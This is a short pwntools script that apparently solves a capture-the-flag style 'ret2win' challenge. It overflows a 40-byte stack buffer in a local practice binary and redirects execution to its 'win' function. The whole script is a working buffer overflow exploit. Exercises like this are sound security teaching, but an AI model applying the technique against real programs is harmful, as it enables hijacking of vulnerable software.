from pwn import *

# --- Configuration ---
binary_path = "./vulnerable"
context.binary = binary_path
context.log_level = 'info'

# --- Analysis ---
# The buffer is 40 bytes. On x86-64, we add 8 bytes to overwrite RBP.
offset = 48

# Use pwntools to find the address of the 'win' function
elf = ELF(binary_path)
win_address = elf.symbols['win']
log.info(f"Calculated offset: {offset}")
log.info(f"Address of 'win' function: {hex(win_address)}")

# --- Exploitation ---
p = process(binary_path)
payload = b'A' * offset + p64(win_address)
p.sendlineafter(b"Enter your name: ", payload)
print(p.recvall().decode())
